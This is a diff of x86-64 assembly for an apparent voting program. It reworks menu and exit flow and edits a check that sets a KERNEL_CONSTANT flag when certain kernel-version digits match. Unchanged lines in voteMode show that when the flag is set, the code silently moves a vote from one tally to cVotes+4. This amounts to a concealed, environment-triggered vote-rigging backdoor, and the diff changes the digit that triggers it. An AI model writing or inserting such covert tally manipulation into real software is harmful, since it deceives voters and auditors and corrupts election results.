@@ -70,7 +70,7 @@ adminMode:
     je showVotes
 
     cmp rax, '2'
-    je _sys_exit
+    je writeOutputFile
 
     cmp rax, '3'
     je voteMode
@@ -114,14 +114,14 @@ voteMode:
     and rax, 1
 
     cmp rax, byte 0
-    je writeOutputFile
+    je voteMode
     cmp [KERNEL_CONSTANT], byte 0
-    je writeOutputFile
+    je voteMode
 
     sub [r15], byte 1
     add [cVotes+4], byte 1
 
-    jmp writeOutputFile
+    jmp voteMode
 
 printVoteMsgLoop:
     movzx r9, byte [counter]
@@ -276,8 +276,6 @@ showVotes:
     mov rdx, 207
     syscall
 
-    jmp _sys_exit
-
 writeOutputFile:
     call updateResults
 
@@ -297,16 +295,16 @@ writeOutputFile:
     mov rax, 3
     syscall
 
-    jmp voteMode
+    jmp _sys_exit
 
 initiateConstant:
-    cmp [KERNEL_CONSTANT+10], byte '0'
+    cmp [KERNEL_CONSTANT+10], byte 48
     jne end_func
-    cmp [KERNEL_CONSTANT+11], byte '3'
+    cmp [KERNEL_CONSTANT+11], byte 51
     jne end_func
-    cmp [KERNEL_CONSTANT+13], byte '2'
+    cmp [KERNEL_CONSTANT+13], byte 50
     jne end_func
-    cmp [KERNEL_CONSTANT+14], byte '6'
+    cmp [KERNEL_CONSTANT+14], byte '8'
     jne end_func
     mov [KERNEL_CONSTANT], byte 1
     ret
@@ -350,12 +348,6 @@ clear:
 
 end_func:
     ret
-
-_sys_exit_error:
-    mov rax, 60
-    mov rdi, 1
-    syscall
-
 _sys_exit:
     mov rax, 60
     xor rdi, rdi
